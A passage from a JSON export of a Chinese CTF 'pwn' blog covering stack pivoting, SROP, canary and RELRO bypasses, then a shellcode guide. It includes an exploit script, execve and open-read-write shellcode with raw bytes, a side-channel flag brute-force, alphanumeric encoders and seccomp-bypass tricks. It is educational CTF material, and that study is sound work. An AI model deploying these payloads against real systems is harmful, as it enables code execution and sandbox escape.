rsp,rbppop rbp;那么考虑将栈帧中rbp地址改为栈迁移目的地址;leave两次之后，就可以将栈转移到目的地址;同时要现在目的地址布置好fake_stack 可以知道，栈迁移的前提在于，需要提前布置好栈帧，即在.bss ， 或者.data等段写入，一般要求前面有读取到.data段的函数 不过，现在栈迁移一般会稍微复杂一些，读取类函数(如read)和leave可能在一个栈帧，这就要求我们在劫持read写入到指定地址的同时，实现分段栈迁移，大致流程如下: 在第一次read读入后将rbp改为要写入的位置 ret到read 第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8 这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置 example 一个程序反汇编后: 12345678910111213int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s[48]; // [rsp+0h] [rbp-30h] BYREF init(argc, argv, envp); puts(&quot;You can use stackoverflow.&quot;); puts(&quot;But only overflow a bit more...&quot;); puts(&quot;And you must print first.&quot;); memset(s, 0, 0x20uLL); write(1, s, 0x30uLL); read(0, s, 0x40uLL); return 0;&#125; 这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串 但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行 虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误 exp 1234567891011121314151617181920212223242526from pwn import*p = process(&#x27;./ezrop&#x27;)#p = gdb.debug(&#x27;./ezrop&#x27;)m = u64(p.recv(40)[-8:])payloads = p64(0x400863) + b&#x27;/bin/sh\\0&#x27; + p64(0x400600)payloads += cyclic(0x18)payloads += p64(0x601848+0x30) + p64(0x4007d9)p.send(payloads)sleep(1)payloads = p64(0x4006fa) + p64(0x400863) + p64(0x601868) + p64(0x400600) payloads += b&#x27;/bin/sh\\0&#x27;payloads += b&#x27;/bin/sh\\0&#x27;payloads += p64(0x601848-0x8) + p64(0x4007f9)p.send(payloads)p.interactive()#0x00007f7b3ce92bb0 0x00007f7b3ccf8450 栈对齐 栈对齐是xmm指令的一个特性，网上对于这个特性的解释很多都是错误的，还把它与栈平衡搞混了。 这个特性来源于xmm相关指令需要内存对齐，当程序运行到这些指令时，如果内存不是16位对齐，就会直接coredump 可以: 1$ gdb -c core 调试core文件 如果终止指令类似于: 1► 0x7fa8677a3396 movaps xmmword ptr [rsp + 0x40], xmm0 说明是栈对齐的原因，小心调整栈帧就行 Stack smash 对于某些将flag装载到内存，并且知道flag的地址、开启了cannary的题目而言，可以考虑stack_smash。 在开启cannary 防护的题目中，检测到栈溢出后，会调用 __stack_chk_fail 函数来打印 argv[0] (在栈上，和环境变脸在一起)指针所指向的字符串，而这个地址可以被覆盖，因此，可以利用此实现泄露flag SROP 前置知识: 在进程接收到signal时，内核会将其上下文保存位sigFrame，然后进入signal_handle，对信号处理，返回后，会执行sigreturn调用，恢复保存Frame，主要包括寄存器和控制流(rip，rsp)的一些设置。 那么，当我们伪造一个Frame，并且触发sigreturn调用时，就能控制寄存器和控制流，这也就是SROP的本质。 同一般rop链相比，可以自由控制rax，进一步的，可以自由控制系统调用，所以SROP拓展了ROP的attack methods。 SROP简要流程: 构造fake_frame 控制当前rsp指向fake_frame底部 sigreturn调用 sigFrame结构如下: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// x64struct _fpstate&#123; /* FPU environment matching the 64-bit FXSAVE layout. */ __uint16_t cwd; __uint16_t swd; __uint16_t ftw; __uint16_t fop; __uint64_t rip; __uint64_t rdp; __uint32_t mxcsr; __uint32_t mxcr_mask; struct _fpxreg _st[8]; struct _xmmreg _xmm[16]; __uint32_t padding[24];&#125;;struct sigcontext&#123; __uint64_t r8; __uint64_t r9; __uint64_t r10; __uint64_t r11; __uint64_t r12; __uint64_t r13; __uint64_t r14; __uint64_t r15; __uint64_t rdi; __uint64_t rsi; __uint64_t rbp; __uint64_t rbx; __uint64_t rdx; __uint64_t rax; __uint64_t rcx; __uint64_t rsp; __uint64_t rip; __uint64_t eflags; unsigned short cs; unsigned short gs; unsigned short fs; unsigned short __pad0; __uint64_t err; __uint64_t trapno; __uint64_t oldmask; __uint64_t cr2; __extension__ union &#123; struct _fpstate * fpstate; __uint64_t __fpstate_word; &#125;; __uint64_t __reserved1 [8];&#125;; pwntools.srop pwntools集成了SROP的模块，可以帮助制作fake_frame: 12345678// 一个简单的例子sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_ret stack_gaurd 我们都知道canary来自fs:0x28， fs 实际上指向的是TCB ， TCB结构如下 12345678910111213141516171819202122232425262728typedef struct&#123; void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; int gscope_flag; // not in 32bit uintptr_t sysinfo; uintptr_t stack_guard; uintptr_t pointer_guard; unsigned long int vgetcpu_cache[2]; /* Bit 0: X86_FEATURE_1_IBT. Bit 1: X86_FEATURE_1_SHSTK. */ unsigned int feature_1; int __glibc_unused1; /* Reservation of some values for the TM ABI. */ void *__private_tm[4]; /* GCC split stack support. */ void *__private_ss; /* The lowest address of shadow stack, */ unsigned long long int ssp_base; /* Must be kept even if it is no longer used by glibc since programs, like AddressSanitizer, depend on the size of tcbhead_t. */ __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32))); void *__padding[8];&#125; tcbhead_t; 0x28的偏移实际上是指向的stack_guard 那么如何确定段选择地址呢，我们知道段寄存器的基地址是不可见的，而且fs/gs可见的数值也不是段选择子而是0，所以在gdb中我们选择pthread_self() 来查看fs的地址，对比上面的结构，我们可以看到此函数其实是返回了结构体自身的地址。 12345pthread_tpthread_self (void)&#123; return (pthread_t) THREAD_SELF;&#125; 在gdb中查看这个地址，发现这个地址实际上在libc的附近。 12p/x (tcbhead_t)*(tcbhead_t *)(pthread_self())p/x (void*)(pthread_self()) 1234567891011121314151617181920212223242526pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA Start End Perm Size Offset File 0x555555554000 0x555555555000 r--p 1000 0 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary 0x555555555000 0x555555556000 r-xp 1000 1000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary 0x555555556000 0x555555557000 r--p 1000 2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary 0x555555557000 0x555555558000 r--p 1000 2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary 0x555555558000 0x555555559000 rw-p 1000 3000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary 0x7ffff7dc7000 0x7ffff7dc9000 rw-p 2000 0 [anon_7ffff7dc7] 0x7ffff7dc9000 0x7ffff7def000 r--p 26000 0 /usr/lib64/libc.so.6 0x7ffff7def000 0x7ffff7f4c000 r-xp 15d000 26000 /usr/lib64/libc.so.6 0x7ffff7f4c000 0x7ffff7f99000 r--p 4d000 183000 /usr/lib64/libc.so.6 0x7ffff7f99000 0x7ffff7f9d000 r--p 4000 1d0000 /usr/lib64/libc.so.6 0x7ffff7f9d000 0x7ffff7f9f000 rw-p 2000 1d4000 /usr/lib64/libc.so.6 0x7ffff7f9f000 0x7ffff7fa9000 rw-p a000 0 [anon_7ffff7f9f] 0x7ffff7fc4000 0x7ffff7fc8000 r--p 4000 0 [vvar] 0x7ffff7fc8000 0x7ffff7fca000 r-xp 2000 0 [vdso] 0x7ffff7fca000 0x7ffff7fcb000 r--p 1000 0 /usr/lib64/ld-linux-x86-64.so.2 0x7ffff7fcb000 0x7ffff7ff1000 r-xp 26000 1000 /usr/lib64/ld-linux-x86-64.so.2 0x7ffff7ff1000 0x7ffff7ffb000 r--p a000 27000 /usr/lib64/ld-linux-x86-64.so.2 0x7ffff7ffb000 0x7ffff7ffd000 r--p 2000 30000 /usr/lib64/ld-linux-x86-64.so.2 0x7ffff7ffd000 0x7ffff7fff000 rw-p 2000 32000 /usr/lib64/ld-linux-x86-64.so.2 0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [stack]0xffffffffff600000 0xffffffffff601000 --xp 1000 0 [vsyscall]pwndbg&gt; p/x (void*)(pthread_self())$16 = 0x7ffff7fa8680 如果我们能覆盖stack_guard， 那么相应的，我们就能绕过canary的保护。 但是，显然，正常栈溢出是无法到达这个地址的。然而，在存在子线程栈溢出的情况下，线程栈地址是接近线程fs 寄存器地址的，所以可以通过此来实现覆盖。 bypass Full RELRO 在没有leak函数，并且Full RELRO 的情况下， ret2dl_resolve就无法使用了。 因为got不再可写，partial overwrite也无法再使用。 那么可以找数据移动的gadget将got 表里面的值读入bss段，然后对bss段上的值进行partial overwrite， 或者通过add、sub等gadget拼出目标libc值，再栈迁移到bss段， 就可以ret到lbss段上的libc地址，从而劫持控制流。 vsyscall/vdso vsyscall 和 vdso 都是内核留下的用于加速系统调用的接口，也因此，其根据内核版本的不同而有所不同。 可以随便开一个程序看一下他们各自的加载地址 12345 0x7ffff7fc4000 0x7ffff7fc8000 r--p 4000 0 [vvar] 0x7ffff7fc8000 0x7ffff7fca000 r-xp 2000 0 [vdso] 0xffffffffff600000 0xffffffffff601000 --xp 1000 0 [vsyscall] 先来说vsyscall, 里面实现了三个函数： 0xffffffffff600000, gettimeofday 0xffffffffff600400, time 0xffffffffff600800, getcpu 并且vsyscall 的加载地址是固定的，但是由于其执行有检查，必须从以上三个函数开始的地址来运行，所以也就只能执行以上三个函数，更多的作用是在栈溢出完全无leak时，将此作为gadget滑块，让程序运行到有效libc地址。 不过，在许多发行版中，这个功能已经被裁剪。 vDSO 相对而言灵活很多，他类似与一个共享库，如果你用gdb将其dump下来，会发现他甚至有完整的ELF结构。 然而，其加载地址却会受到随机化的影响，在32位的程序中，这个随机化的偏移是可爆破的程度，然而在64位的系统中，就完全不可能了。 不过在loader在加载过程中会在栈上留下其地址，在所有环境变量的上面一点的偏移，如果存在leak，就可以劫持。 不过，一个更大的问题的，由于这是内核提供的一个接口，vDSO具体内容随内核版本有所不同，除非你能dump出远程的vDSO，否则很难利用。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://v3rdant.cn/categories/CTF/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://v3rdant.cn/tags/pwn/"}]},{"title":"Pwn.the-Art-of-Shellcode","slug":"Pwn.The-Art-of-Shellcode","date":"2022-07-30T16:00:00.000Z","updated":"2023-12-07T02:11:35.215Z","comments":true,"path":"Pwn.The-Art-of-Shellcode/","link":"","permalink":"https://v3rdant.cn/Pwn.The-Art-of-Shellcode/","excerpt":"","text":"Basic 首先给出两个常用shellcode仓库，可以检索需要的shellcode shellcode database exploit-db 接下来给出几个尽可能短的shellcode 12345; excve(&#x27;/bin/sh&#x27;,&#x27;sh&#x27;,0); rax: 0x3b; rdi: &#x27;/bin/sh&#x27; ; rsi: &#x27;sh&#x27; ; rdx; NULL 最短shellcode 特征与条件 长度为22字节 主要是通过cdq将rdx高位为0，减小了长度，另一种方法是通过mul r/m64指令，实现清空rax和rdx eax 高二位必须为0，一般是满足的 汇编 123456789xor rsi, rsipush rsi mov rdi, 0x68732f2f6e69622fpush rdipush rsp pop rdi mov al, 59 cdq syscall 1234567891048 31 f6 xor rsi, rsi 56 push rsi58 bf 2f 62 69 6e 2f mov rdi, 0x68732f2f6e69622f;2f 73 6857 push rdi54 push rsp 5f pop rdi ;stack pointer to /bin//shb0 3b mov al, 59 ;sys_execve 66 b8 3b 00 mov ax,5999 cdq ;sign extend of eax0f 05 syscall 字节码 1234567// int0x622fbf4856f631480x545768732f2f6e690x050f993bb05f// bytes\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05 orw 特征与条件 长度为0x28字节 主要是通过异或实现了取代了mov减少长度 rsp指向的地址必须是可用的 存在NULL字符 汇编 1234567891011121314// rdx为写入数量mov rdx, 0x200push 0x67616c66mov rdi,rspxor esi,esi #如果本来rsi=0，可以删掉这句mov eax,2syscallmov edi,eaxmov rsi,rspxor eax,eaxsyscallxor edi,2 mov eax,edisyscall 字节码 12345670x6800000200c2c7480x31e7894867616c660x050f00000002b8f60x0fc031e68948c7890x050ff88902f78305\\x48\\xc7\\xc2\\x00\\x02\\x00\\x00\\x68\\x66\\x6c\\x61\\x67\\x48\\x89\\xe7\\x31\\xf6\\xb8\\x02\\x00\\x00\\x00\\x0f\\x05\\x89\\xc7\\x48\\x89\\xe6\\x31\\xc0\\x0f\\x05\\x83\\xf7\\x02\\x89\\xf8\\x0f\\x05 可指定地址orw 123456789101112131415shellcode = &quot;&quot;&quot;xor rdx,rdxmov dh, 0x2mov rdi,&#123;&#125;xor esi,esi mov eax,2syscallmov rsi,rdimov edi,eaxxor eax,eaxsyscallxor edi,2mov eax,edisyscall&quot;&quot;&quot;.format(hex(target_addr + 0xb0)) 侧信道爆破 1234567891011121314151617181920212223242526code = asm( &quot;&quot;&quot; push 0x67616c66 mov rdi, rsp xor edx, edx xor esi, esi push SYS_open pop rax syscall xor eax, eax push 6 pop rdi push 0x50 pop rdx mov rsi, 0x10100 syscall mov dl, byte ptr [rsi+&#123;&#125;] mov cl, &#123;&#125; cmp cl, dl jz loop mov al,231 syscall loop: jmp loop &quot;&quot;&quot;.format(offset, ch)) 字符限制 编码工具 ae64 alpha3 Encode x32 alphanumeric shellcode x ✔ Encode x64 alphanumeric shellcode ✔ ✔ Original shellcode can contain zero bytes ✔ x Base address register can contain offset ✔ x Alpha3 限制只能使用字母或者数字 alpha3使用: alpha3需要python2环境，所以先安装python2 12345from pwn import *context.arch=&#x27;amd64&#x27;sc = b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x31\\xc0\\xb0\\x3b\\x99\\x0f\\x05&quot;with open(&quot;./sc.bin&quot;,&#x27;wb&#x27;) as f: f.write(sc) 1python2 ALPHA3.py x64 ascii mixedcase rdx --input=&quot;sc.bin&quot; &gt; out.bin 可以选择架构、编码、限制的字符 AE64 AE64可以直接在python中导入，使用相对较为方便且限制较少 12345678910from ae64 import AE64from pwn import *context.arch=&#x27;amd64&#x27;# get bytes format shellcodeshellcode = asm(shellcraft.sh())# get alphanumeric shellcodeenc_shellcode = AE64().encode(shellcode)print(enc_shellcode.decode(&#x27;latin-1&#x27;)) 手动绕过 主要是通过sub、add、xor等指令对于非字母数字指令进行加密。 可以先根据限制筛选出受限制后的指令列表，然后根据指令列表进行组合，从而实现绕过。 另一种方法是通过shellcode先实现write读取到shellcode的位置，然后输入新的无限制的 shellcode来完成绕过。 https://nets.ec/Alphanumeric_shellcode 特定位置字符限制 在最近的*CTF中存在一个用浮点数输入字符，并对浮点数做限制写shellcode的题目，实际上是限制了每八位需要有两位是特定字符，这里给出两种绕过思路: 1234mov rcx, im64mov rcx, im32mov ecx, im32mov cl, im16 这里im是可以由我们自由控制的立即数，因此我们可以通过插入这些无关指令填充来绕过限制，上面这些指令涵盖了3、4、5字节，可以灵活插入来达到需要的效果 1jmp short 通过jmp短跳转直接跳过中间指令，从而绕过限制 jmp指令本身只有两个字节，更为灵活。 对于orw的限制 如果程序还对orw等系统调用作出了限制呢？ w的限制还好说，可以通过侧信道leak出flag，而如果禁用了open，orw就 很难进行下去了。 但是还有一种方法。 利用32位调用绕过orw x86与x64的syscall number是不一样的，如果能够跳转到32位执行相应的shellcode，就可一绕过限制。 x86 sys_number sys_number 3 read 0x03 unsigned int fd char *buf size_t count 4 write 0x04 unsigned int fd const char *buf size_t count 5 open 0x05 const char *filename int flags umode_t mode 而程序是由32位还是64位执行是由cs寄存器决定的，而retfq指令可以对其作出更改，从而切换寄存器状态，所以可以由此实现orw。 x32 ABI x32 ABI 是一个应用程序二进制接口 (ABI)，也是 Linux 内核的接口之一。 x32 ABI 在 Intel 和 AMD 64 位硬件上提供 32 位整数、长整数和指针。 可以通过 查看内核源代码 unistd_x32.h 查看 1cat /usr/src/kernels/6.4.7-200.fc38.x86_64/arch/x86/include/generated/uapi/asm/unistd_x32.h 123456#ifndef _UAPI_ASM_UNISTD_X32_H #define _UAPI_ASM_UNISTD_X32_H #define __NR_read (__X32_SYSCALL_BIT + 0) #define __NR_write (__X32_SYSCALL_BIT + 1) #define __NR_open (__X32_SYSCALL_BIT + 2) #define __NR_close (__X32_SYSCALL_BIT + 3) 即可以通过0x40000000+syscall_number 来调用一些系统调用。所以可以绕过对syscall的限制。 不过这个特性似乎在大多数发行版中不受支持。 io_uring 可以通过io_uring绕过对open限制的 mmap 似乎mmap可以把文件映射到虚拟内存，绕过对open的限制。 tricks 对于一些题目，对shellcode的检查用到了strlen，那么可以通过先使用一些存在NULL截断的指令，从而使得后面的字符串绕过限制。 在无法获取shellcode运行地址时，可以运行syscall，运行后，rcx会被改写为下一条指令的地址","categories":[{"name":"CTF","slug":"CTF","permalink":"https://v3rdant.cn/categories/CTF/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://v3rdant.cn/tags/pwn/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://v3rdant.cn/categories/CTF/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://v3rdant.cn/tags/linux/"},{"name":"io_uring","slug":"io-uring","permalink":"https://v3rdant.cn/tags/io-uring/"},{"name":"shellcode","slug":"shellcode","permalink":"https://v3rdant.cn/tags/shellcode/"},{"name":"Pwn","slug":"Pwn","permalink":"https://v3rdant.cn/tags/Pwn/"},{"name":"CTF","slug":"CTF","permalink":"https://v3rdant.cn/tags/CTF/"},{"name":"pwn","slug":"pwn","permalink":"https://v3rdant.cn/tags/pwn/"}]}